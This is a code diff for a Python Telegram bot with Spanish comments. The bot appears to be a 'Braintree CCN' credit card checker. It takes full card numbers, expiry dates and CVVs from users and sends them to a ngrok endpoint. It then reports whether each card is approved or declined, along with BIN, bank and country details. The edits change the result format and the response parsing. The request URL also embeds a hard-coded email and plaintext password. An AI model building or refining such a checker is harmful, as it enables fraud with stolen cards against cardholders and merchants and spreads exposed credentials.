@@ -80,7 +80,7 @@ def process_braintree_ccn(bot, message):
         # Enviar mensaje de procesamiento
         processing_msg = bot.reply_to(message, "🔄 Procesando tu tarjeta en Braintree...")
         
-        # URL CORREGIDA para Braintree CCN
+        # URL para Braintree CCN
         braintree_url = f"https://componential-unstruggling-shantel.ngrok-free.dev//check_cc?cc={cc_number}|{expiry_month}|{formatted_year}|{cvv}&email=wasdark336@gmail.com&password=bbmEZs65p!BJLNz"
         
         # Hacer la solicitud simple con requests
@@ -112,20 +112,23 @@ def process_braintree_ccn(bot, message):
         # Eliminar mensaje de procesamiento
         bot.delete_message(message.chat.id, processing_msg.message_id)
         
-        # Formatear respuesta ordenada - Mismo formato que VBV
+        # Formatear respuesta ordenada - NUEVO FORMATO
         response_text = f"""
-▬▬▬▬▬⌁・⌁▬▬▬▬▬
-カ 𝐂𝐚𝐫𝐝: {cc_number}|{expiry_month}|{expiry_year}|{cvv}
-❀ 𝐁𝐫𝐚𝐢𝐧𝐭𝐫𝐞𝐞: {status}
-┄┄┄┄┄┄┄┄┄┄┄┄┄┄
-✿ 𝑻𝒚𝒑𝒆 ➜ {bin_info.get('type', 'UNKNOWN')}
-✿ 𝑳𝒆𝒗𝒆𝒍 ➜ {bin_info.get('brand', 'UNKNOWN')}
-✿ 𝑩𝒂𝒏𝒌 ➜ {bin_info.get('bank', 'UNKNOWN BANK')}
-✿ 𝑪𝒐𝒖𝒏𝒕𝒓𝒚 ➜ {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
-▬▬▬▬▬⌁・⌁▬▬▬▬▬
-⏱ 𝐓𝐢𝐦𝐞: {processing_time}s
-👤 𝐔𝐬𝐞𝐫: {username} [{plan}]
-{usage_line}
+- - - - - - - - - - - - - - - - - - - - -
+#Meliodas | Braintree_CCN
+- - - - - - - - - - - - - - - - - - - - - 
+🝮 Card : {cc_number}|{expiry_month}|{expiry_year}|{cvv}
+🝮 Status : {status}
+🝮 Result : {result_message}
+- - - - - - - - - - - - - - - - - - - - -
+🝮 Bin : {bin_info.get('scheme', 'UNKNOWN')} | {bin_info.get('brand', 'UNKNOWN')}
+🝮 Bank : {bin_info.get('bank', 'UNKNOWN BANK')}
+🝮 Country : {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
+- - - - - - - - - - - - - - - - - - - - -
+🝮 Proxy : Live ✅ | Retry: 0
+🝮 Time : {processing_time}s
+🝮 Checked by : {username} [{plan}]
+- - - - - - - - - - - - - - - - - - - - -
 """
         
         bot.reply_to(message, response_text)
@@ -150,16 +153,16 @@ def make_simple_request(url):
 def extract_message_from_response(response):
     """Extrae el mensaje del JSON de respuesta"""
     try:
-        # Intentar parsear como JSON
         data = json.loads(response)
         if "response" in data:
             return data["response"]
+        elif "error" in data:
+            return data["error"]
         elif "message" in data:
             return data["message"]
         else:
-            return response[:100]  # Limitar longitud si no es JSON válido
+            return response[:100]
     except:
-        # Si no es JSON válido, devolver la respuesta original limitada
         return response[:100] if response else "NO RESPONSE"
 
 def get_status_from_response(response):
@@ -168,22 +171,19 @@ def get_status_from_response(response):
         data = json.loads(response)
         status = data.get("status", "").lower()
         
-        if status == "approved":
-            return "APPROVED ✅"
-        elif status == "declined":
-            return "DECLINED ❌"
+        if status == "approved" or "approved" in str(data.get("response", "")).lower():
+            return "Approved"
+        elif status == "declined" or "declined" in str(data.get("response", "")).lower():
+            return "Declined"
+        elif "cannot authorize" in str(data.get("response", "")).lower():
+            return "Declined"
         else:
-            return "UNKNOWN 🔄"
+            return "Unknown"
             
     except:
-        # Si no es JSON, buscar palabras clave en el texto
-        if not response:
-            return "NO RESPONSE"
-        elif "approved" in response.lower():
-            return "APPROVED ✅"
-        elif "declined" in response.lower():
-            return "DECLINED ❌"
-        elif "error" in response.lower():
-            return "ERROR ⚠️"
+        if "approved" in response.lower():
+            return "Approved"
+        elif "declined" in response.lower() or "cannot authorize" in response.lower():
+            return "Declined"
         else:
-            return "UNKNOWN 🔄"
+            return "Unknown"
